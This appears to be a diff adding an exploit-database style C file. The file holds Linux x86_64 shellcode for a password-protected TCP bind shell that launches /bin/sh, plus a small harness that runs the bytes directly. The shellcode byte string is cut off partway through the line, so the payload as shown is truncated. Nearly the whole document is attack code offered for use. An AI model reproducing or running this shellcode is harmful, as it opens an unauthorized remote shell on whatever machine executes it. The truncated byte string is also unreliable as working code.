@@ -1,0 +1,25 @@
+/*
+# Exploit Title: Linux/x64 TCP_bindshell+execve("/bin/sh") using password with nulls Shellcode
+# Author: LOkavya PolamReddy
+# Date: 2026-05-23
+# Platform: Linux x86_64
+# Shellcode Length: 342 bytes
+# Tested on: Kali Linux
+# CVE: N/A
+#password: secret
+*/
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] =\
+"\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\xb8\x31\x00\x00\x00\x48\x89\>
+
+int  main()
+{
+    printf("Shellcode length: %d\n", sizeof(code)-1);
+
+    int (*ret)() = (int(*)())code;
+    ret();
+   return 0;
+
+}
